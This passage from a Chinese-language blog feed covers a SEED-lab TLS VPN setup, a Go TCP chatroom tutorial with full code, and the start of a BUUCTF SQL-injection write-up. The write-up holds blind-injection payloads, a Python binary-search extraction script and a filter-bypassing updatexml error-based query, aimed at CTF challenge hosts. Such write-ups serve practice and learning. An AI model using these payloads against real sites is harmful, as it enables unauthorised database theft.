     <span class="hljs-keyword">if</span> (FD_ISSET(sockfd, &amp;readFDSet)) socketSelected(tunfd, sockfd, ssl);
   &#125;
&#125;</code></pre>



<h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>由于在上ubuntu 18.04上运行时，程序出现错误，所以使用了seedLab 提供的 ubuntu 16.04重新搭建了实验环境。各个网卡信息与上面的实验一样。</p>
<blockquote>
<p>host U：ubuntu 16.04</p>
<p>VPNserver：ubuntu 16.04</p>
<p>host V：ubuntu 16.04</p>
</blockquote>
<h3 id="主机物理网卡配置-1"><a href="#主机物理网卡配置-1" class="headerlink" title="主机物理网卡配置"></a>主机物理网卡配置</h3><table>
<thead>
<tr>
<th align="center">主机</th>
<th align="center">角色</th>
<th align="center">IP地址</th>
</tr>
</thead>
<tbody><tr>
<td align="center">客户机</td>
<td align="center">VPN客户机&#x2F;host U</td>
<td align="center">10.0.2.7&#x2F;24</td>
</tr>
<tr>
<td align="center">服务器</td>
<td align="center">VPN服务器&#x2F;网关</td>
<td align="center">10.0.2.8&#x2F;24<br>192.168.60.1&#x2F;24</td>
</tr>
<tr>
<td align="center">内网主机</td>
<td align="center">host V</td>
<td align="center">192.168.60.101&#x2F;24</td>
</tr>
</tbody></table>
<h3 id="连通性测试"><a href="#连通性测试" class="headerlink" title="连通性测试"></a>连通性测试</h3><p>配置完各个网卡的IP地址后</p>
<ul>
<li><p>host U 可以 ping 通 VPNserver (10.0.2.0&#x2F;24)</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717190020679.png" alt="image-20210717190020679" style="zoom:67%;">

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203822712.png" alt="image-20210716203822712" style="zoom: 50%;">
</li>
<li><p>VPN server 可以ping 通两台主机</p>
<p><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717185939151.png" alt="image-20210717185939151" style="zoom: 67%;"><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717185952701.png" alt="image-20210717185952701" style="zoom:67%;"></p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203744476.png" alt="image-20210716203744476" style="zoom: 50%;">
</li>
<li><p>host V可以ping 通VPNserver (192.168.60.0&#x2F;24)</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717190103613.png" alt="image-20210717190103613" style="zoom:67%;">

<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210716203807499.png" alt="image-20210716203807499" style="zoom: 50%;"></li>
</ul>
<h3 id="CA和证书设置"><a href="#CA和证书设置" class="headerlink" title="CA和证书设置"></a>CA和证书设置</h3><p>(1)、为 CA 生成一个自签名证书，它将作为根证书，如下所示：</p>
<pre><code class="hljs vim">openssl req -<span class="hljs-keyword">new</span> -x509 -keyout <span class="hljs-keyword">ca</span>.key -out <span class="hljs-keyword">ca</span>.crt -config openssl.<span class="hljs-keyword">cnf</span>
//文件 <span class="hljs-keyword">ca</span>.key 包含 CA 的私钥，而 <span class="hljs-keyword">ca</span>.crt 包含公钥证书。</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192409460.png" alt="image-20210717192409460" style="zoom:80%;">



<p>(2)、接下来，我们使用以下命令为服务器创建一个 RSA 公私钥对</p>
<pre><code class="hljs pgsql">openssl genrsa -aes128 -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.key <span class="hljs-number">1024</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192456568.png" alt="image-20210717192456568"></p>
<p>(3)、创建一个包含服务器公钥的证书签名请求 (CSR)。 CSR 具有以下详细信息，服务器的通用名称为 <code>sunzy.com</code>：</p>
<pre><code class="hljs pgsql">openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.csr -config openssl.cnf</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717192547722.png" alt="image-20210717192547722" style="zoom:80%;">



<p>(4)、然后将上述 CSR 发送到 CA 以生成密钥和通用名称的证书。</p>
<pre><code class="hljs pgsql">openssl x509 -req -days <span class="hljs-number">365</span> -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.csr -signkey <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt</code></pre>

<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210716211833071.png" alt="image-20210716211833071" style="zoom: 67%;">



<p>(5)、将服务器的证书和密钥存储为 pem 文件，这里是</p>
<pre><code class="hljs axapta">cp <span class="hljs-keyword">server</span>.crt <span class="hljs-keyword">server</span>-cert.pem
cp <span class="hljs-keyword">server</span>.key <span class="hljs-keyword">server</span>-key.pem</code></pre>

<p>VPN Server 程序使用这些文件来加载证书和私钥，如下所示</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717105652371.png" alt="image-20210717105652371"></p>
<p>(6)、使用名称作为主题字段的哈希存储服务器的证书。这是因为在接收服务器的证书时，TLS 会根据颁发者的身份信息生成一个哈希值，并使用此哈希值在“.&#x2F;cert”文件夹中查找颁发者的证书，命令如下:(以下命令在ca_client 文件下执行)</p>
<pre><code class="hljs vim">openssl x509 -in <span class="hljs-keyword">ca</span>.crt -noout -subject_hash
<span class="hljs-keyword">ln</span> -s <span class="hljs-keyword">ca</span>.crt b4386d70.<span class="hljs-number">0</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717105919161.png" alt="image-20210717105919161"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717200542030.png" alt="image-20210717200542030"></p>
<h2 id="建立TLS通信"><a href="#建立TLS通信" class="headerlink" title="建立TLS通信"></a>建立TLS通信</h2><h3 id="VPN-server"><a href="#VPN-server" class="headerlink" title="VPN server"></a>VPN server</h3><p>首先在VPN服务器上执行以下命令，将c程序编译为可执行程序</p>
<pre><code class="hljs llvm">gcc -o vpnserver_tls vpnserver_tls.<span class="hljs-keyword">c</span> -lssl -lcrypto -lcrypt</code></pre>

<p>执行编译好的程序，此时该程序处于监听状态等待客户端的连接</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717110722763.png" alt="image-20210717110722763"></p>
<p>此时该程序将创建一个<code>tun0</code>虚拟网卡，使用以下命令配置网卡信息</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig tun0 <span class="hljs-number">192.168.53.1</span>/<span class="hljs-number">24</span> up</code></pre>

<p>配置完后的网卡信息如图：</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717104726586.png" alt="image-20210717104726586" style="zoom:67%;">

<p>编辑路由表并将设置为转发模式</p>
<pre><code class="hljs routeros">sudo<span class="hljs-built_in"> route </span><span class="hljs-built_in">add</span> –net 192.168.53.0/24 tun0
sudo sysctl net.ipv4.<span class="hljs-attribute">ip_forward</span>=1</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717092728424.png" alt="image-20210717092728424"></p>
<h3 id="VPN-client"><a href="#VPN-client" class="headerlink" title="VPN client"></a>VPN client</h3><p>与服务器上一样，首先编译c程序</p>
<pre><code class="hljs llvm">gcc -o vpnclient_tls vpnclient_tls.<span class="hljs-keyword">c</span> -lssl -lcrypto</code></pre>

<p>执行该程序（该域名与上面创建的证书中的通用名称一样）</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ./vpnclient_tls <span class="hljs-string">&quot;sunzy.com&quot;</span> <span class="hljs-number">4433</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111325426.png" alt="image-20210717111325426"></p>
<p>创建连接后，服务器端确认后，开始身份认证</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111437904.png" alt="image-20210717111437904"></p>
<p>服务器端收到的消息如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717111535076.png" alt="image-20210717111535076"></p>
<p>此时TLS连接已经建立。</p>
<p>配置tun0和路由表</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> ifconfig tun0 <span class="hljs-number">192.168.53.5</span>/<span class="hljs-number">24</span> up
<span class="hljs-attribute">sudo</span> route add -net <span class="hljs-number">192.168.60.0</span>/<span class="hljs-number">24</span></code></pre>

<h3 id="Host-V"><a href="#Host-V" class="headerlink" title="Host V"></a>Host V</h3><p>要实现内外网主机之间的通信，还需要在内网主机上添加路由表信息</p>
<pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> route add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> enp0s3</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717113001100.png" alt="image-20210717113001100"></p>
<h3 id="VPN-server和VPN-client-的连接信息"><a href="#VPN-server和VPN-client-的连接信息" class="headerlink" title="VPN server和VPN client 的连接信息"></a>VPN server和VPN client 的连接信息</h3><p><code>VPN server</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717160935019.png" alt="image-20210717160935019"></p>
<p><code>VPN client</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717161031264.png" alt="image-20210717161031264"></p>
<h2 id="通信验证"><a href="#通信验证" class="headerlink" title="通信验证"></a>通信验证</h2><h3 id="ping-测试-1"><a href="#ping-测试-1" class="headerlink" title="ping 测试"></a>ping 测试</h3><ul>
<li>客户端（10.0.2.7）ping 内网主机（192.168.60.101）</li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717104553457.png" alt="image-20210717104553457" style="zoom:67%;">

<ul>
<li>内网主机(192.168.60.101) ping 10.0.2.7</li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717104633291.png" alt="image-20210717104633291" style="zoom:67%;">

<p>查看客户端上的 Wireshark 数据时，我们看到 ping 请求从 tun0 发送到内部网络 IP，并且此数据包从 VPN 客户端发送到 VPN tunnel</p>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717153451936.png" alt="image-20210717153451936" style="zoom:67%;">

<p>在服务器端，我们看到类似的流量——主机 U 和主机 V 之间的 ping 请求和回复通信，中间有 VPN 服务器。 </p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717133757659.png" alt="image-20210717133757659" style="zoom:67%;">

<h3 id="telnet-测试"><a href="#telnet-测试" class="headerlink" title="telnet 测试"></a>telnet 测试</h3><ul>
<li>首先在在Host U上使用telnet控制Host V</li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717114933233.png" alt="image-20210717114933233" style="zoom: 67%;">

<ul>
<li>在内网主机Host V 上telnet 客户端HostU</li>
</ul>
<img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210717115511290.png" alt="image-20210717115511290" style="zoom: 67%;">

<p>wireshark抓取的telnet的通信数据包</p>
<p>VPN server上的数据包信息</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210717153538769.png" alt="image-20210717153538769" style="zoom:67%;">

<h2 id="命令集合"><a href="#命令集合" class="headerlink" title="命令集合"></a>命令集合</h2><h3 id="VPN-server-1"><a href="#VPN-server-1" class="headerlink" title="VPN server"></a>VPN server</h3><pre><code class="hljs shell">//编译程序
gcc -o vpnserver_tls vpnserver_tls.c -lssl -lcrypto -lcrypt
//启动程序
sudo ./vpnserver_tls 4433</code></pre>

<pre><code class="hljs shell">//设置tun0信息 添加转发功能 添加路由
sudo ifconfig tun0 192.168.53.1/24 up
sudo sysctl net.ipv4.ip_forward=1
sudo route add -net 192.168.53.0/24 tun0
sudo route add -net 192.168.60.0/24 tun0</code></pre>

<h3 id="VPN-client-1"><a href="#VPN-client-1" class="headerlink" title="VPN client"></a>VPN client</h3><pre><code class="hljs awk"><span class="hljs-regexp">//</span>编译程序
gcc -o vpnclient_tls vpnclient_tls.c -lssl -lcrypto
<span class="hljs-regexp">//</span>启动程序
sudo ./vpnclient_tls sunzy.com <span class="hljs-number">4433</span></code></pre>

<pre><code class="hljs armasm"><span class="hljs-comment">//设置tun0信息  添加路由</span>
<span class="hljs-symbol">sudo</span> ifconfig tun0 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">53</span>.<span class="hljs-number">5</span>/<span class="hljs-number">24</span> up
<span class="hljs-symbol">sudo</span> route <span class="hljs-keyword">add</span> -net <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">60</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span></code></pre>

<h3 id="内网主机"><a href="#内网主机" class="headerlink" title="内网主机"></a>内网主机</h3><pre><code class="hljs apache"><span class="hljs-attribute">route</span> add -net <span class="hljs-number">192.168.53.0</span>/<span class="hljs-number">24</span> gw <span class="hljs-number">192.168.60.1</span> enp0s3</code></pre>

]]></content>
      <categories>
        <category>homework</category>
      </categories>
      <tags>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>chatroom</title>
    <url>/2022/12/07/chatroom/</url>
    <content><![CDATA[<h1 id="GO语言实现的聊天室"><a href="#GO语言实现的聊天室" class="headerlink" title="GO语言实现的聊天室"></a>GO语言实现的聊天室</h1><p>实现很简单，基于tcp socket,做这个小项目的目的是检测对channel的理解，channel在并发场景中真的好用，但是有时候也是真挺难理解的</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>每个连接的用户需要对应一个账号，因此需要创建一个全局的struct，用户有名字，id，以及接受消息的管道</p>
<pre><code class="hljs go"><span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;
	<span class="hljs-comment">// 名字</span>
	name <span class="hljs-type">string</span>
	<span class="hljs-comment">// id</span>
	id <span class="hljs-type">string</span>
	<span class="hljs-comment">// msg管道</span>
	msg <span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>
&#125;</code></pre>

<h3 id="map-amp-message"><a href="#map-amp-message" class="headerlink" title="map&amp;message"></a>map&amp;message</h3><p>还需要一个全局的map保存所有的用户信息，以便服务器端向所有的用户转发消息</p>
<pre><code class="hljs go"><span class="hljs-comment">// 需要一个全局的map存储所有user信息</span>
<span class="hljs-keyword">var</span> allUsers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>] User)</code></pre>

<p>转发消息时又需要一个管道接收用户发送的消息后转发给所有用户</p>
<pre><code class="hljs go"><span class="hljs-comment">// 需要一个全局的管道message 向所有用户发送消息</span>
<span class="hljs-keyword">var</span> message = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">10</span>)</code></pre>



<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><p>需要一个广播函数，开启该goroutine后可以一直监听message管道中的消息，然后向用户转发消息</p>
<p>需要一个业务处理函数，当用户发送消息后，通过该函数处理</p>
<p>需要一个消息反馈函数，将User.msg中的消息返回到客户端</p>
<h3 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">broadcast</span><span class="hljs-params">()</span></span>&#123;
	fmt.Println(<span class="hljs-string">&quot;[+]:广播go协程启动成功...&quot;</span>)
	<span class="hljs-keyword">for</span>&#123;
		<span class="hljs-comment">// 从message中读取数据</span>
		info := &lt;- message
		<span class="hljs-comment">// 将消息发送给所有用户</span>
		<span class="hljs-keyword">if</span> info != <span class="hljs-string">&quot;&quot;</span>&#123;
			<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> allUsers&#123;
				user.msg &lt;- info
			&#125;
		&#125;
	&#125;
&#125;</code></pre>

<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;
	<span class="hljs-keyword">for</span> <span class="hljs-literal">true</span> &#123;
		fmt.Println(<span class="hljs-string">&quot;[+]:启动业务...&quot;</span>)
		<span class="hljs-comment">// 每次建立新连接需要创建一个user</span>
		clientAddr := conn.RemoteAddr().String()
		newUser := User&#123;
			name : clientAddr,
			id : clientAddr,
			msg: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>),  <span class="hljs-comment">// 一定要使用make，否则没有空间写人</span>
		&#125;
		fmt.Println(clientAddr)

		_, ok := allUsers[clientAddr]
		<span class="hljs-keyword">if</span> !ok&#123;
			<span class="hljs-comment">//将新创建的用户添加到map中</span>
			allUsers[newUser.id] = newUser
			<span class="hljs-comment">// 向广播中写入消息 通知其他人你已经上线</span>
			loginInfo := fmt.Sprintf(<span class="hljs-string">&quot;[%s]:[%s] ====&gt; online now!&quot;</span>, newUser.name, newUser.id)
			message &lt;- loginInfo
			time.Sleep(time.Second)
			<span class="hljs-keyword">go</span> writeToClient(newUser, conn)
		&#125;
		buf:= <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1024</span>)
		cnt, err := conn.Read(buf)
		<span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;
			fmt.Println(<span class="hljs-string">&quot;conn.Read error: &quot;</span> , err)
		&#125;
		<span class="hljs-comment">//fmt.Println(&quot;服务器端接受的数据为：&quot;,  string(buf[:cnt]), &quot;, cnt:&quot;, cnt)</span>
		userInfo:= fmt.Sprintf(<span class="hljs-string">&quot;[%s] say:&quot;</span>, clientAddr)
		message &lt;- userInfo + <span class="hljs-type">string</span>(buf[:cnt])
	&#125;
&#125;</code></pre>

<h3 id="writeToClient"><a href="#writeToClient" class="headerlink" title="writeToClient"></a>writeToClient</h3><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeToClient</span><span class="hljs-params">(user User, conn net.Conn)</span></span>&#123;
	<span class="hljs-keyword">for</span> msg := <span class="hljs-keyword">range</span> user.msg&#123;
		conn.Write([]<span class="hljs-type">byte</span>(msg + <span class="hljs-string">&quot;\n&quot;</span>))
	&#125;
&#125;</code></pre>



<p>完整程序</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">&quot;fmt&quot;</span>
	<span class="hljs-string">&quot;net&quot;</span>
	<span class="hljs-string">&quot;time&quot;</span>
)

<span class="hljs-keyword">type</span> User <span class="hljs-keyword">struct</span> &#123;
	<span class="hljs-comment">// 名字</span>
	name <span class="hljs-type">string</span>
	<span class="hljs-comment">// id</span>
	id <span class="hljs-type">string</span>
	<span class="hljs-comment">// msg管道</span>
	msg <span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>
&#125;
<span class="hljs-comment">// 需要一个全局的map存储所有user信息</span>
<span class="hljs-keyword">var</span> allUsers = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>] User)
<span class="hljs-comment">// 需要一个全局的管道message 向所有用户发送消息</span>
<span class="hljs-keyword">var</span> message = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">10</span>)
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
	listen, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:8080&quot;</span>)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
		fmt.Println(<span class="hljs-string">&quot;net.listen err: &quot;</span>, err)
	&#125;
	fmt.Println(<span class="hljs-string">&quot;[+]:服务器监听成功&quot;</span>)
	<span class="hljs-comment">// 启动全局唯一的 广播协程</span>
	<span class="hljs-keyword">go</span> broadcast()
	<span class="hljs-keyword">for</span>&#123;
		accept, err := listen.Accept()
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;
			fmt.Println(<span class="hljs-string">&quot;[+]:listen.accept err: &quot;</span>, err)
		&#125;
		fmt.Println(<span class="hljs-string">&quot;[+]:建立连接成功...&quot;</span>)
		<span class="hljs-keyword">go</span> handler(accept)

	&#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(conn net.Conn)</span></span> &#123;
	<span class="hljs-keyword">for</span> <span class="hljs-literal">true</span> &#123;
		fmt.Println(<span class="hljs-string">&quot;[+]:启动业务...&quot;</span>)
		<span class="hljs-comment">// 每次建立新连接需要创建一个user</span>
		clientAddr := conn.RemoteAddr().String()
		newUser := User&#123;
			name : clientAddr,
			id : clientAddr,
			msg: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>),  <span class="hljs-comment">// 一定要使用make，否则没有空间写人</span>
		&#125;
		fmt.Println(clientAddr)

		_, ok := allUsers[clientAddr]
		<span class="hljs-keyword">if</span> !ok&#123;
			<span class="hljs-comment">//将新创建的用户添加到map中</span>
			allUsers[newUser.id] = newUser
			<span class="hljs-comment">// 向广播中写入消息 通知其他人你已经上线</span>
			loginInfo := fmt.Sprintf(<span class="hljs-string">&quot;[%s]:[%s] ====&gt; online now!&quot;</span>, newUser.name, newUser.id)
			message &lt;- loginInfo
			time.Sleep(time.Second)
			<span class="hljs-keyword">go</span> writeToClient(newUser, conn)
		&#125;
		buf:= <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">1024</span>)
		cnt, err := conn.Read(buf)
		<span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;
			fmt.Println(<span class="hljs-string">&quot;conn.Read error: &quot;</span> , err)
		&#125;
		<span class="hljs-comment">//fmt.Println(&quot;服务器端接受的数据为：&quot;,  string(buf[:cnt]), &quot;, cnt:&quot;, cnt)</span>
		userInfo:= fmt.Sprintf(<span class="hljs-string">&quot;[%s] say:&quot;</span>, clientAddr)
		message &lt;- userInfo + <span class="hljs-type">string</span>(buf[:cnt])
	&#125;
&#125;

<span class="hljs-comment">// 向所有用户广播消息， 全局唯一</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">broadcast</span><span class="hljs-params">()</span></span>&#123;
	fmt.Println(<span class="hljs-string">&quot;[+]:广播go协程启动成功...&quot;</span>)
	<span class="hljs-keyword">for</span>&#123;
		<span class="hljs-comment">// 从message中读取数据</span>
		info := &lt;- message
		<span class="hljs-comment">// 将消息发送给所有用户</span>
		<span class="hljs-keyword">if</span> info != <span class="hljs-string">&quot;&quot;</span>&#123;
			<span class="hljs-keyword">for</span> _, user := <span class="hljs-keyword">range</span> allUsers&#123;
				user.msg &lt;- info
			&#125;
		&#125;
	&#125;
&#125;

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">writeToClient</span><span class="hljs-params">(user User, conn net.Conn)</span></span>&#123;
	<span class="hljs-keyword">for</span> msg := <span class="hljs-keyword">range</span> user.msg&#123;
		conn.Write([]<span class="hljs-type">byte</span>(msg + <span class="hljs-string">&quot;\n&quot;</span>))
	&#125;
&#125;

</code></pre>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>用户一</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103317397.png" alt="image-20221207103317397"></p>
<p>用户二</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103251004.png" alt="image-20221207103251004"></p>
<p>用户三</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103427557.png" alt="image-20221207103427557"></p>
<p>控制台消息</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207103500122.png"></p>
<p>后续再对聊天室进一步优化</p>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>socket</tag>
        <tag>go</tag>
        <tag>tcp</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-sql注入</title>
    <url>/2020/10/05/buuoj/</url>
    <content><![CDATA[<h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><span id="more"></span>

<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png"></p>
<p>构造盲注语句</p>
<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png"></p>
<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png"></p>
<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
<pre><code class="hljs python">// 二分注入
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">&quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;</span>

data = &#123;<span class="hljs-built_in">id</span> : <span class="hljs-string">&quot;&quot;</span>&#125;

flag = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
    left = <span class="hljs-number">33</span>
    right = <span class="hljs-number">128</span>
    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span>(right&gt;left):

        data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
        response = requests.post(url,data=data)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
            left = mid+<span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            right = mid
        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
    flag = flag + <span class="hljs-built_in">chr</span>(mid)
    <span class="hljs-built_in">print</span>(flag)

<span class="hljs-built_in">print</span>(flag)</code></pre>





<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
<p>测试发现<code> or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png"></p>
<p>可是使用报错注入</p>
<blockquote>
<p>报错注入原理：</p>
<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
</blockquote>
<p>相关链接</p>
<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
<blockquote>
<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
</blockquote>
<p>查询语句如下</p>
<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>

